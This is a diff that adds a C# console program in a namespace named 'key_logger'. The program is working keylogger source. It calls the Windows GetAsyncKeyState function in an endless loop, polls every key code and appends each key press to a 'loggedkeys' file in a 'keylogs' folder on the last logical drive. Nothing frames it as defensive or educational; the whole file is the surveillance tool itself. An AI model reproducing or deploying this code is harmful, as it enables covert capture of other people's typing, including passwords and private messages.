@@ -1,0 +1,91 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Threading;
+namespace key_logger
+{
+    class Program
+    {
+
+
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+        static void Main(string[] args)
+        {
+
+
+
+            string[] filepath = Environment.GetLogicalDrives();
+            string filepaths = filepath[filepath.Length - 1];
+            filepaths = filepaths + @"/keylogs/";
+            if (!Directory.Exists(filepaths))
+            {
+
+
+                Directory.CreateDirectory(filepaths);
+            }
+
+            string path = (@filepaths + "loggedkeys");
+            if (!File.Exists(path))
+            {
+
+                using (StreamWriter sw = File.CreateText(path))
+                { 
+                
+                
+                
+                
+                }
+            }
+            //end
+
+
+
+
+
+                KeysConverter coverter = new KeysConverter();
+                string text = " ";
+                while (5>1)
+                {
+                    Thread.Sleep(10);
+                    for (int i = 0; i < 2000; i++)
+                    {
+                        int key = GetAsyncKeyState(i);
+                        if (key==1||key==-32767)
+                        {
+                            text = coverter.ConvertToString(i);
+                            using(StreamWriter sw = File.AppendText(path))
+                            {
+
+                                sw.WriteLine(text);
+                            
+                            }
+                            break;
+                        }
+                      
+                    }
+
+
+                }
+  
+
+            
+             
+           
+         
+
+
+
+
+
+
+
+
+        }
+    }
+}
